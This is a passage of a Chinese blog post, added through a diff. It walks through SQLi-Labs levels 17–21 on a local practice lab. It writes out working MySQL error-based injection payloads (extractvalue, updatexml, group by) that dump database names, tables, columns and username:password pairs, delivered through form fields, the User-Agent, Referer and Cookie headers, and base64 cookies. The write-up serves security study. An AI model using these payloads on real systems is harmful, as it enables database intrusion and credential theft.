@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="update 类型注入，insert 类型注入，extractvalue 报错注入，updatexml 报错注入，group by 报错注入，http 头传递 payload。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《SQLi-Labs》03. Less 17~22">
+<meta property="og:url" content="http://example.com/2023/05/06/%E3%80%8ASQLi-Labs%E3%80%8B03.%20Less%2017~22/index.html">
+<meta property="og:site_name" content="镜坛">
+<meta property="og:description" content="update 类型注入，insert 类型注入，extractvalue 报错注入，updatexml 报错注入，group by 报错注入，http 头传递 payload。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/c2cf9dd27774478e91279f3fea242cd2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/d6eac93a89c24dc098e8415c605f6d95.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/34e8440d9f9846469cefe17f11681c29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/3d5259977ee04c6bbf671335d741e561.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/fd5e1c070b7d46b9865018e9ce6c4d4c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/435e45dc62c0495e8cdcc34160c9ee23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/4db334ef9a4d436facc67599d28b8b5c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/97e28373498442a5b6116d4c49e3356f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/debb6a1f19334dab94547ab96edd4b2d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/36dc95df50f24f8f8bd558f43949a16e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/53d24e0f4c864ab7a4bf58271d0b626b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/62a4bdbebf534a7f812546771f4107c2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/f43e7d24d2214092ac70861685f77342.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/873b2e31b88049adb0c32e99da4bfcc2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/dff0225fa9fa4a5a8f40b039416f62b1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/36e98446ad2f4705a9bde8ac2f93f1fe.png">
+<meta property="article:published_time" content="2023-05-06T15:22:47.000Z">
+<meta property="article:modified_time" content="2023-10-12T11:29:46.000Z">
+<meta property="article:author" content="镜坛主">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/c2cf9dd27774478e91279f3fea242cd2.png"><title>《SQLi-Labs》03. Less 17~22 | 镜坛</title><link ref="canonical" href="http://example.com/2023/05/06/%E3%80%8ASQLi-Labs%E3%80%8B03.%20Less%2017~22/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":true},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《SQLi-Labs》03. Less 17~22</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-05-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-12</span></span></div></header><div class="post-body"><p>@<a href="SQLi-Labs">TOC</a></p>
+<hr>
+<blockquote>
+<p>靶场部署在 VMware - Win7。</p>
+</blockquote>
+
+        <h1 id="索引"   >
+          <a href="#索引" class="heading-link"><i class="fas fa-link"></i></a><a href="#索引" class="headerlink" title="索引"></a>索引</h1>
+      <ul>
+<li><strong>Less-17</strong>：update 类型注入，字符型【’】，extractvalue 报错注入，updatexml 报错注入，group by 报错注入。</li>
+<li><strong>Less-18</strong>：insert 类型注入，字符型【’】，User Agent 头传递 payload，extractvalue 报错注入，updatexml 报错注入。</li>
+<li><strong>Less-19</strong>：insert 类型注入，字符型【’】，Referer 头传递 payload，报错注入。</li>
+<li><strong>Less-20</strong>：insert 类型注入，字符型【’】，Cookie 传递 payload，报错注入。</li>
+<li><strong>Less-21</strong>：insert 类型注入，字符型【’)】，Cookie 传递 payload（需 base64 编码），报错注入。</li>
+<li><strong>Less-22</strong>：insert 类型注入，字符型【”】，Cookie 传递 payload（需 base64 编码），报错注入。</li>
+</ul>
+
+        <h1 id="Less-17"   >
+          <a href="#Less-17" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1>
+      <p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/c2cf9dd27774478e91279f3fea242cd2.png" alt="在这里插入图片描述"></p>
+
+        <h2 id="题解"   >
+          <a href="#题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解" class="headerlink" title="题解"></a>题解</h2>
+      <p>第 17 关是密码重置页面，之前的联合注入、布尔盲注以及时间盲注都不能用了。</p>
+<p>由于是在修改密码处有注入，所以使用 burp 在 passwd 处传递 payload，比较方便。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/d6eac93a89c24dc098e8415c605f6d95.png" alt="在这里插入图片描述"></p>
+<p>先直接看报错注入的方法。</p>
+
+        <h3 id="方法一"   >
+          <a href="#方法一" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3>
+      <p>extractvalue 报错注入。</p>
+<p><strong>爆数据库版本</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,version(),0x7e)))#</span><br><span class="line"># 另一种写法：</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>接下来只需要将 <code>select @@version</code> 换成其他子句就可以进行其他的注入了。<br><code>concat()</code> 和 <code>group_concat()</code> 作用一样。</p>
+</blockquote>
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e)))#</span><br><span class="line"># 另一种写法：</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e))#</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>mysql 数据库不支持同一张表同时查询和更新，所以在爆同一张表的字段内容时需要加一个中间表，也就是子查询。但这样一次就只能查询一个用户名与密码，而且用户名需要猜解。</p>
+</blockquote>
+<p><strong>针对 MySQL 爆同一张表字段内容</strong>（需要猜解用户名 username）：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#x27;admin1&#x27;) b) ,0x7e)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/34e8440d9f9846469cefe17f11681c29.png" alt="在这里插入图片描述"></p>
+<p><strong>对于其他表，可以正常爆出所有字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(id,&#x27;:&#x27;,email_id) from emails),0x7e)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/3d5259977ee04c6bbf671335d741e561.png" alt="在这里插入图片描述"></p>
+
+        <h3 id="方法二"   >
+          <a href="#方法二" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3>
+      <p>updatexml 报错注入，和方法一的 extractvalue 报错注入类似。</p>
+<p><strong>爆数据库版本</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,version(),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>针对 MySQL 爆同一张表字段内容</strong>（需要猜解用户名 username）：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select password from (select password from users where username=&#x27;admin1&#x27;) b),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>对于其他表，可以正常爆出所有字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml (1,concat(0x7e,(select group_concat(id,&#x27;:&#x27;,email_id) from emails),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="方法三"   >
+          <a href="#方法三" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3>
+      <p>group by 报错注入。</p>
+<p><strong>爆数据库版本</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x7e,floor(rand(0)*2)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x7e,floor(rand(0)*2)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>针对 MySQL 爆同一张表字段内容</strong>（需要猜解用户名 username）：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+      <p>update 类型注入。</p>
+<p><strong>extractvalue 报错注入</strong>：</p>
+<ul>
+<li><code>EXTRACTVALUE(XML_document, XPath_string)</code><ul>
+<li><code>XML_document</code>：String 格式，为 XML 文档对象的名称。</li>
+<li><code>XPath_string</code>：Xpath 格式的字符串，需要了解 Xpath 语法。</li>
+<li><strong>介绍</strong>：用于从 XML_document 中提取符合 XPATH_string 值的 SQL 函数。</li>
+</ul>
+</li>
+</ul>
+<p><strong>updatexml 报错注入</strong>：</p>
+<ul>
+<li><code>UPDATEXML(XML_document, XPath_string, new_value)</code><ul>
+<li><code>XML_document</code>：String 格式，为 XML 文档对象的名称。</li>
+<li><code>XPath_string</code>：Xpath 格式的字符串，需要了解 Xpath 语法。</li>
+<li><code>new_value</code>：String 格式，替换查找到的符合条件的数据。</li>
+<li><strong>介绍</strong>：改变 XML_document 中符合 XPATH_string 的值，用于在 XML 类型的数据中更新元素的值。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>updatexml() 报错注入和 extractvalue() 报错注入差不多。当 XPath_string 语法报错时就会触发报错。可以通过构造恶意的 XML 数据来触发报错消息，从而获取敏感信息。</p>
+</blockquote>
+<p><strong>group by 报错注入</strong>可以参考：</p>
+<p><strong>《深入理解group by报错注入》</strong>：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986" >https://blog.csdn.net/m0_53065491&#x2F;article&#x2F;details&#x2F;121893986</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="Less-18"   >
+          <a href="#Less-18" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1>
+      <p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/fd5e1c070b7d46b9865018e9ce6c4d4c.png" alt="在这里插入图片描述"></p>
+
+        <h2 id="题解-1"   >
+          <a href="#题解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2>
+      <blockquote>
+<p>这题可以使用以下用户登录：用户名：Dhakkan，默认密码：dumbo。当然密码可能在 Less-17 被更改了。</p>
+</blockquote>
+<p>这题登录成功后可以看到回显了 User Agent 头。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/435e45dc62c0495e8cdcc34160c9ee23.png" alt="在这里插入图片描述"></p>
+<p>看了一下源码，这题属于 insert 类型的注入，后端将 User Agent 的值插入了数据库。</p>
+<p>且插入语句需要三个参数。因为【#】后面都被注释了，所以构造 payload 时也需要有三个参数。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/4db334ef9a4d436facc67599d28b8b5c.png" alt="在这里插入图片描述"></p>
+<p>依旧使用报错注入，通过 User Agent 头传递 payload。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/97e28373498442a5b6116d4c49e3356f.png" alt="在这里插入图片描述"></p>
+<p>构造数据简单判断字符类型。页面显示正常则可以将其他参数换成 sql 语句进行报错注入。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,2,3)#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/debb6a1f19334dab94547ab96edd4b2d.png" alt="在这里插入图片描述"></p>
+<p>可以使用 extractvalue 报错注入与 updatexml 报错注入，这里以 updatexml 报错注入为例。</p>
+<p><strong>爆数据库版本</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;, 2, (updatexml(1,concat(0x7e,version(),0x7e),1)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;, 2, (updatexml(1,concat(0x7e,database(),0x7e),1)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,2, (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段名</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,2, (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x7e),1)))#</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;, 2, updatexml(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password) from users),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/36dc95df50f24f8f8bd558f43949a16e.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>注意爆出的数据长度有限。</p>
+</blockquote>
+
+        <h2 id="总结-1"   >
+          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
+      <p>insert 类型注入。</p>
+<p>User Agent 头传递 payload。</p>
+<p>详见 Less-17：</p>
+<ul>
+<li>extractvalue 报错注入</li>
+<li>updatexml 报错注入</li>
+</ul>
+
+        <h1 id="Less-19"   >
+          <a href="#Less-19" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1>
+      
+        <h2 id="题解-2"   >
+          <a href="#题解-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2>
+      <blockquote>
+<p>这题可以使用以下用户登录：用户名：Dhakkan，默认密码：dumbo。当然密码可能在 Less-17 被更改了。</p>
+</blockquote>
+<p>当输入正确的账户密码时 referer 字段内容会显示在页面。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/53d24e0f4c864ab7a4bf58271d0b626b.png" alt="在这里插入图片描述"></p>
+<p>与 Less-18 类似，插入的 sql 语句有两个参数，一个是 referfer，一个是 ip 地址。</p>
+<p><strong>爆字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;, updatexml(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password) from users),0x7e),1))#</span><br></pre></td></tr></table></div></figure>
+
+<p>其他语句参考 Less-18。</p>
+
+        <h1 id="Less-20"   >
+          <a href="#Less-20" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1>
+      
+        <h2 id="题解-3"   >
+          <a href="#题解-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2>
+      <blockquote>
+<p>这题可以使用以下用户登录：用户名：Dhakkan，默认密码：dumbo。当然密码可能在 Less-17 被更改了。</p>
+</blockquote>
+<p>当输入正确的账户密码时 Cookie 字段内容会显示在页面。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/62a4bdbebf534a7f812546771f4107c2.png" alt="在这里插入图片描述"></p>
+<p>通过 Cookie 字段传递 payload。理解了 Less-18 这题就会做了，原理和 Less-18 一样。</p>
+<p><strong>爆字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users),0x7e),1)#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/f43e7d24d2214092ac70861685f77342.png" alt="在这里插入图片描述"></p>
+<p>其他语句参考 Less-18。</p>
+
+        <h1 id="Less-21"   >
+          <a href="#Less-21" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1>
+      
+        <h2 id="题解-4"   >
+          <a href="#题解-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2>
+      <p>与 Less-20 很像，只不过 Cookie 经过了 base64 编码而已。且是【’)】字符型。</p>
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/873b2e31b88049adb0c32e99da4bfcc2.png" alt="在这里插入图片描述"></p>
+<p>将注入语句 base64 编码后传递即可。</p>
+<p><strong>爆字段内容</strong>：</p>
